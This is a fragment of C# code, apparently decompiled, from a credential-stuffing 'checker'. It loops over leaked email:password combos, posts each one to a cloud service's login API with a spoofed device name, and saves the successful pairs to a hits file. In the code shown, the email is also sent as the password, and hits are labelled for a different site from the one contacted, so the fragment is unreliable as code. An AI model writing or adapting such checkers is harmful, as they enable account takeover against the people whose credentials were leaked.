        ...
        while (true)
        {
          try
          {
            using (HttpRequest httpRequest = new HttpRequest())
            {
              ...
              string str = "{\"email\":\"" + s[0] + "\",\"name\":\"samsung SM-G925F\",\"pass\":\"" + s[0] + "\"}";
              if (httpRequest.Post("https://api-v2.remotrcloud.com/login", str, "application/json;charset=UTF-8").ToString().Contains("status\":\"success\""))
              {
                ++mainmenu.hits;
                if (mainmenu.p1 == "2")
                  Colorful.Console.WriteLine("[HIT - VORTEX.GG] " + s[0] + ":" + s[1], Color.Green);
                Export.AsResult("/Vortex.gg_hits", s[0] + ":" + s[1]);
                return false;
              }
              break;
            }
